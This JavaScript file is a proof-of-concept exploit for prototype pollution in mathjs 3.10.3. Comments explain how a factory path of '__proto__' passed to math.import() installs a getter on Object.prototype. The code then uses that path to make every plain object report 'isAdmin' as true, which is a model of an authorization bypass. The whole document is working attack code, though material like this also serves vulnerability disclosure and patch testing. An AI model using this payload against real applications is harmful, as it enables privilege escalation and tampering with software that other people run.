```javascript
// Prototype Pollution in mathjs 3.10.3 via math.import()'s resolver
//
// lib/core/function/import.js's `_importFactory` computes:
//   namespace = factory.path ? traverse(math, factory.path) : math;
// and installs a lazy getter, `resolver`, onto `namespace`:
//   lazy(namespace, name, resolver)
//
// lib/utils/object.js's `traverse()` walks the dot-separated path with
// `part in target` / `target = target[part]`, so a path of "__proto__"
// resolves `namespace` to Object.prototype. `lazy()` then does
// Object.defineProperty(Object.prototype, name, { get: resolver, ... }),
// so calling resolver() pollutes every object in the process.

const math = require("mathjs");

// No prior pollution.
console.log("before:", ({}).isAdmin); // undefined

math.import(
  {
    name: "isAdmin",
    path: "__proto__",           // escapes math's namespace onto Object.prototype
    factory: function () {
      return true;               // attacker-controlled value installed via `resolver`
    },
  },
  {}
);

// Triggering the lazy `resolver` getter on ANY plain object now returns
// the attacker-controlled value -- Object.prototype has been polluted.
const victim = {};
console.log("after:", victim.isAdmin); // true
console.log("after (fresh object):", ({}).isAdmin); // true
```
